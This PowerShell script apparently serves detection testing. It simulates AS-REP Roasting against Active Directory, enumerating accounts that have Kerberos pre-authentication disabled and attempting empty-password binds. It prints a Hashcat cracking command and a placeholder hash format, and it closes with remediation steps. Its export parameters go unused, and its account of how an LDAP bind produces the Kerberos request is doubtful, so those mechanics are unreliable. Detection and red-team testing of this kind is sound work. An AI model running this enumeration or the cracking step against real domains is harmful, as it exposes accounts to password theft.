<#
.SYNOPSIS
    AS-REP Roasting Attack Simulation Script
.DESCRIPTION
    Simulates an AS-REP Roasting attack against Active Directory accounts that
    have Kerberos Pre-Authentication disabled (DONT_REQ_PREAUTH flag set).
    Generates Event ID 4768 telemetry for SIEM detection and visibility testing.
.NOTES
    Author: Ajit Nayak (https://ajit028.github.io)
    Target: Authorized lab environment only (MITRE ATT&CK: T1558.004)
    References: https://attack.mitre.org/techniques/T1558/004/
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Domain = $env:USERDOMAIN,

    [Parameter(Mandatory=$false)]
    [switch]$ExportHashes,

    [Parameter(Mandatory=$false)]
    [string]$OutputFile = ".\asrep_hashes.txt"
)

Write-Host "[*] AS-REP Roasting Simulation (MITRE ATT&CK T1558.004)" -ForegroundColor Cyan
Write-Host "[*] Target Domain: $Domain" -ForegroundColor Yellow
Write-Host "[!] WARNING: Run only in authorized lab environments!" -ForegroundColor Red

# Step 1: Enumerate accounts with Pre-Authentication Disabled
# DONT_REQ_PREAUTH is User Account Control (UAC) flag 0x400000 (4194304)
Write-Host "`n[+] Step 1: Enumerating accounts with Kerberos Pre-Auth disabled (DONT_REQ_PREAUTH)..." -ForegroundColor Green

$vulnerableAccounts = @()

try {
    if (Get-Module -ListAvailable -Name ActiveDirectory) {
        Import-Module ActiveDirectory -ErrorAction Stop

        # Filter: userAccountControl bit 4194304 = DONT_REQ_PREAUTH
        $vulnerableAccounts = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} `
            -Properties SamAccountName, UserPrincipalName, PasswordLastSet, LastLogonDate, MemberOf |
                Select-Object SamAccountName, UserPrincipalName, PasswordLastSet, LastLogonDate, MemberOf

        Write-Host "[+] Found $($vulnerableAccounts.Count) account(s) with Pre-Auth disabled." -ForegroundColor Green
    } else {
        # Fallback: Use DirectorySearcher with raw UAC bitmask filter
        Write-Host "[*] AD module not available. Using DirectorySearcher fallback..." -ForegroundColor Yellow
        $searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
        $results = $searcher.FindAll()

        foreach ($r in $results) {
            $vulnerableAccounts += [PSCustomObject]@{
                SamAccountName  = $r.Properties['samaccountname'][0]
                UserPrincipalName = $r.Properties['userprincipalname'][0]
                PasswordLastSet  = $r.Properties['pwdlastset'][0]
            }
        }
        Write-Host "[+] Found $($vulnerableAccounts.Count) account(s) with Pre-Auth disabled." -ForegroundColor Green
    }
} catch {
    Write-Host "[-] Error querying AD: $_" -ForegroundColor Red
    exit 1
}

if ($vulnerableAccounts.Count -eq 0) {
    Write-Host "[!] No vulnerable accounts found. To test: Set-ADAccountControl -Identity 'testuser' -DoesNotRequirePreAuth `$true" -ForegroundColor Yellow
    exit 0
}

Write-Host "`n[*] Vulnerable Accounts Summary:" -ForegroundColor Yellow
$vulnerableAccounts | Format-Table SamAccountName, UserPrincipalName, PasswordLastSet, LastLogonDate -AutoSize

# Step 2: Explain the AS-REP Roasting Mechanism
Write-Host "`n[+] Step 2: AS-REP Roasting Mechanism" -ForegroundColor Green
Write-Host @"
    ┌──────────────────────────────────────────────────────────┐
    │  NORMAL KERBEROS FLOW:                                   │
    │  Client → KDC: AS-REQ with encrypted timestamp          │
    │  KDC validates timestamp → Issues TGT                   │
    │                                                          │
    │  AS-REP ROASTING (DONT_REQ_PREAUTH = true):             │
    │  Client → KDC: AS-REQ with username ONLY (no preauth)   │
    │  KDC BLINDLY issues TGT → Contains encrypted blob       │
    │  Attacker captures blob → Offline crack with Hashcat    │
    │                                                          │
    │  Hashcat command:                                        │
    │  hashcat -m 18200 asrep_hash.txt wordlist.txt           │
    └──────────────────────────────────────────────────────────┘
"@ -ForegroundColor Gray

# Step 3: Simulate AS-REP request using Kerberos .NET APIs
Write-Host "`n[+] Step 3: Simulating AS-REP authentication requests..." -ForegroundColor Green

foreach ($account in $vulnerableAccounts) {
    $username = $account.SamAccountName
    Write-Host "    [*] Processing: $username" -ForegroundColor Cyan

    # Attempt AS-REQ via DirectoryEntry authentication (no preauth)
    try {
        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry(
            "LDAP://$Domain",
            $username,
            "",      # Empty password — simulates anonymous AS-REQ
            [System.DirectoryServices.AuthenticationTypes]::Secure
        )
        $null = $directoryEntry.SchemaEntry
    } catch {
        # Expected to fail — but the AS-REQ triggers Event 4768 on DC
        Write-Host "    [+] AS-REQ sent for $username (4768 event generated on DC)" -ForegroundColor Green
        Write-Host "    [*] Event 4768 PreAuthentication Type would be: 0 (No Preauth)" -ForegroundColor Gray
    }

    # Hash output format (for documentation / educational purposes)
    $hashExample = "`$krb5asrep`$23`$$username@$Domain`:<encrypted_blob_would_appear_here>"
    Write-Host "    [*] Hash format for Hashcat (-m 18200): $hashExample" -ForegroundColor DarkGray
}

# Step 4: Remediation Guidance
Write-Host "`n[!] REMEDIATION STEPS:" -ForegroundColor Red
Write-Host "    1. Require Pre-Authentication for all accounts:" -ForegroundColor Yellow
Write-Host "       Set-ADAccountControl -Identity <username> -DoesNotRequirePreAuth `$false" -ForegroundColor White
Write-Host "    2. Enforce strong password policies (minimum 20+ chars for service accounts)" -ForegroundColor Yellow
Write-Host "    3. Monitor Event ID 4768 with PreAuthentication Type = 0 in your SIEM" -ForegroundColor Yellow
Write-Host "    4. Use Group Managed Service Accounts (gMSA) for service accounts" -ForegroundColor Yellow

Write-Host "`n[*] AS-REP Roasting simulation complete." -ForegroundColor Green
Write-Host "[*] Review Event ID 4768 on the Domain Controller (Failure Code 0x0 with PreAuth type 0x0)." -ForegroundColor Cyan
